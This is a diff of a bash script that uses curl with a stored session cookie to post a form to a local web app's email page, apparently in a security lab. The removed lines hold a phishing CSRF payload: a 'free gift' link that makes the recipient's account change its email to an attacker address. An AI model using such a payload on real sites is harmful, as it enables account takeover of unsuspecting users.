@@ -1,6 +1,3 @@
-
-#DATA="send_email=1&receiver_emails=hacker@gmail.com&title=WWHEATETGSAGSHDFIGASHRGAIWRHGAWRIGH&content=<a href='/pages/user/mail.php?id=3&new_email=hacker2@gmail.com&change_email=1'>Cliquez ici pour un cadeau!</a>"
-
 #!/bin/bash
 
 # Read session information from session_info.txt
@@ -19,9 +16,9 @@ MAIL_PAGE_URL="http://127.0.0.1/pages/user/send_email.php?id=$USER_ID"
 # Use PHPSESSID and form data to send a POST request
 response=$(curl -i -L -X POST "$MAIL_PAGE_URL" \
     -b "PHPSESSID=$PHPSESSID" \
-    -d "receiver_emails=hacker@gmail.com" \
-    -d "title=WWHEATETGSAGSHDFIGASHRGAIWRHGAWRIGH" \
-    -d "content=<a href='/pages/user/mail.php?id=3&new_email=hacker2@gmail.com&change_email=1'>Cliquez ici pour un cadeau!</a>" \
+    -d "receiver_emails=1" \
+    -d "title=1" \
+    -d "content=1" \
     -d "send_email=""")
 
 # Check HTTP status code and if there are new emails
